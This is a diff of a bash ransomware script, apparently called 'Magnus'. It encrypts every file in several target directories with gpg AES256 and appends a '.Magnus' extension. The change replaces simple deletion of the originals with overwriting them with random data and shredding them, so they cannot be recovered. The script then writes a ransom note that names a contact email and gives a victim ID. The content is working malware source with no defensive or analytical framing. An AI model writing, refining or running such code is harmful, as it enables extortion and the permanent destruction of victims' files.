@@ -104,7 +104,14 @@ for file in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $targ
     if [ -d "$file" ]; then
         continue
     fi
-    echo "$password" | gpg --batch --yes --passphrase-fd 0 --symmetric --cipher-algo AES256 -o "$file.Magnus" "$file" && rm "$file"
+    echo "$password" | gpg --batch --yes --passphrase-fd 0 --symmetric --cipher-algo AES256 -o "$file.Magnus" "$file" 
+done
+
+for file in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 $target_dir_6 -type f); do
+    if [ -f "$file.Magnus" ]; then
+        dd if=/dev/urandom of=$file bs=1M count=10
+        shred -n 10 -u $file
+    fi
 done
 
 echo "Your files have all been encrypted, contact example@protonmail.com for the decryption key! Your unique victim ID: $victim_id" > R34DM3.txt
